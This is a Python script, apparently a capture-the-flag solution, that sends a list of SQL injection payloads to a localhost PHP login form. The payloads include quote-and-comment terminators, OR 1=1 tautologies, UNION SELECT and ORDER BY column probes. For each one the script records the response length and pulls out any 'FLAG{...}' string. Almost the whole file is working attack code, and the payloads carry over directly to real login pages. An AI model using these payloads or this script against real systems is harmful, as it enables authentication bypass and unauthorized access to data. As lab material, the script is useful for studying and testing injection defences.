import requests
import re

target = "http://127.0.0.1:32895/index.php"

print("[*] Testing various SQL injection comment styles and techniques\n")

payloads = [
    "admin'-- -",
    "admin'#",
    "admin'/*",
    "admin' --",
    "admin';--",
    "admin' or '1'='1'-- -",
    "admin' or '1'='1'#",
    "admin' or 1=1-- -",
    "admin' or 1=1#",
    "admin' union select null-- -",
    "admin' union select 1,2,3,4,5,6,7,8,9-- -",
    "admin') or '1'='1'-- -",
    "admin') or 1=1-- -",
    "admin\") or \"1\"=\"1\"-- -",
    "admin\") or 1=1-- -",
    "admin' order by 10-- -",
    "admin' order by 1-- -",
]

lengths = {}
for payload in payloads:
    r = requests.get(target, params={'username': payload, 'password': 'test'})
    length = len(r.text)
    has_flag = 'FLAG{' in r.text
    
    if length not in lengths:
        lengths[length] = []
    lengths[length].append((payload, has_flag))
    
    print(f"Payload: {payload:45} | Length: {length} | FLAG: {has_flag}")
    
    if has_flag:
        flags = re.findall(r'FLAG\{[^}]+\}', r.text)
        print(f"  [!!!] FLAG FOUND: {flags[0]}")
        print(f"  Full response:\n{r.text}\n")

print(f"\n[*] Summary: Found {len(lengths)} unique response lengths")
for length, payloads_list in sorted(lengths.items()):
    print(f"  Length {length}: {len(payloads_list)} payloads")

